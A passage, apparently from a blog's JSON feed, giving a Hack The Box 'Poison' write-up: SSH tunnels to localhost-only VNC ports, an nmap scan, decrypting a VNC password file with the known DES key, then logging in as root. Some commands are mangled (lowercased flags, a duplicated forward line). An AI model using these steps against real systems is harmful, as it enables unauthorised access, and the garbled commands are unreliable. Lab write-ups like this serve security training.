*:* i had already checked for any mail-related privesc vectors at this point, so i was more interested in ports 5801 and 5901. however, since they were only accessible by localhost on poison, i had to forward them to my attacker machine.\n# forward port 5801 ssh -n -l 5801:127.0.0.1:5801 charix@10.10.10.84 # forward port 5901 ssh -n -l 5801:127.0.0.1:5801 charix@10.10.10.84 now we can do some more enumeration.\n┌──(kali㉿kali)-[~] └─$ sudo nmap -p5801,5901 127.0.0.1 -sv --script=default starting nmap 7.94svn ( https://nmap.org ) at 2024-09-17 19:27 gmt nmap scan report for localhost (127.0.0.1) host is up (0.000097s latency). port state service version 5801/tcp open http bacula http config 5901/tcp open vnc vnc (protocol 3.8) | vnc-info: | protocol version: 3.8 | security types: | vnc authentication (2) | tight (16) | tight auth subtypes: |_ stdv vncauth_ (2) service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 10.83 seconds vnc is running on port 5901. vnc is a system designed to share screens. this means that a user using vnc can interact with\u0026hellip; the vnc password file is usually stored in ~/.vnc/passwd. this path does not exist for charix though, but there was a passwd file that we extracted from secret.zip. we can check if it it indeed a vnc password file by attempting to extract its password:\n┌──(kali㉿kali)-[/tmp] └─$ cat secret | openssl enc -des-cbc -nopad -nosalt -k e84ad660c4721ae0 -iv 0000000000000000 -d vncp@$$! success! now that we are certain we have a vnc password file, we can use it to connect to poison.\n┌──(kali㉿kali)-[/tmp] └─$ vncviewer -passwd secret 127.0.0.1::5901 congrats, you\u0026rsquo;ve rooted poison!\n","title":"Poison"}]
}

